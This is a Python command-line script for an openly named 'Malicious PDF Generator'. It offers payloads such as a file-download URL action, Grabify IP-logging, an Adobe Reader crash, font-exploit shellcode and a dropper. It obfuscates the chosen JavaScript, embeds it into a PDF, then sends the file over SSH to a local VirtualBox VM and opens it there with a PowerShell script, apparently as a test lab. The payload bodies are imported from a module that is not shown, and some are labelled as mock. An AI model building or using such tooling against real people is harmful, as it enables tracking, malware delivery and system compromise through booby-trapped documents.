from malicious_pdf_generator import obfuscated_code, embedded_javascript_into_pdf, create_ssh_client, transfer_file, execute_powershell_script, const

import argparse
import pyfiglet
import os
import sys
import argparse
from pathlib import Path


def cli():
    """
    Command-line interface for the malicious PDF generator.
    :return: argparse.Namespace: The parsed arguments.
    """
    parser = argparse.ArgumentParser(description="Generate a malicious PDF file.")
    parser.add_argument("-i", "--input",
                        help=const.INPUT_PDF_OPTION_HELP,
                        required=False,
                        default=const.INPUT_PDF_DEFAULT)
    parser.add_argument("-o", "--output",
                        help=const.OUTPUT_PDF_OPTION_HELP,
                        required=False,
                        default=const.OUTPUT_PDF_DEFAULT)
    arguments = parser.parse_args()

    return arguments


def generate_malicious_pdf(js_code, input_pdf, output_pdf):
    """
    Generates a malicious PDF file with embedded JavaScript code.
    :param js_code: javascript code
    :param input_pdf: template pdf file
    :param output_pdf: output pdf file
    :return:
    """
    embedded_javascript_into_pdf(obfuscated_code(js_code), input_pdf, output_pdf)
    print(f"JavaScript code embedded into {output_pdf}.")


def choose_payload():
    """
    Choose the payload to embed in the PDF file.
    :return: type: str: The payload to embed.
    """
    payload = None

    while payload is None:

        print("Choose the payload to embed into the pdf file:")
        print("1. Download file (URL action)")
        print("2. Alert message")
        print("3. Collect information using Grabify (URL action)")
        print("4. Adobe Reader Calculate Crash")
        print("5. Adobe Reader Font Exploit Shellcode")
        print("6. Dropper")
        choice = int(input("Enter the payload number: "))

        if choice == 1:
            payload = const.PAYLOAD_DOWNLOAD_FILE
        elif choice == 2:
            payload = const.JS_CODE
        elif choice == 3:
            payload = const.PAYLOAD_COLLECT_INFORMATION_USING_GRABIFY
        elif choice == 4:
            payload = const.PAYLOAD_MOCK_ADOBE_CRASH
        elif choice == 5:
            payload = const.PAYLOAD_MOCK_SHELLCODE_ADOBE_EXPLOIT   
        elif choice == 6:
            payload = const.PAYLOAD_DROPPER       
        else:
            print("Invalid choice.")
    return payload


def banner():
    """
    Display the banner for the malicious PDF generator.
    :return:
    """
    ban = pyfiglet.figlet_format("Malicious PDF Generator", font="slant")
    print(ban)


def main():
    banner()
    args = cli()
    payload = choose_payload()
    generate_malicious_pdf(payload, args.input, args.output)

    # Deployment variables
    host = 'localhost'
    port = 2222
    username = 'vboxuser'
    key_filepath = '~/.ssh/id_rsa'
    remote_dir = 'C:/Users/vboxuser/Documents'
    local_pdf_path = args.output  

    # Expand user tilde (~) in paths
    key_filepath = os.path.expanduser(key_filepath)
    local_pdf_path = os.path.expanduser(local_pdf_path)

    # Validate SSH key path
    key_path = Path(key_filepath)
    if not key_path.is_file():
        print(f"[ERROR] The SSH key file {key_filepath} does not exist.")
        sys.exit(1)

    # Establish SSH connection
    ssh_client = create_ssh_client(
        host=host,
        port=port,
        username=username,
        key_filepath=key_filepath
    )

    # Define remote file path
    remote_pdf_path = os.path.join(remote_dir, os.path.basename(local_pdf_path))

    # Transfer the PDF
    transfer_file(ssh_client, local_pdf_path, remote_pdf_path)

    # Execute the PowerShell script on the VM
    script_path = 'C:\\Users\\vboxuser\\scripts\\Open-Pdf-interactive.ps1'  #
    execute_powershell_script(ssh_client, script_path, remote_pdf_path)

    # Close SSH connection
    ssh_client.close()

if __name__ == "__main__":
    main()
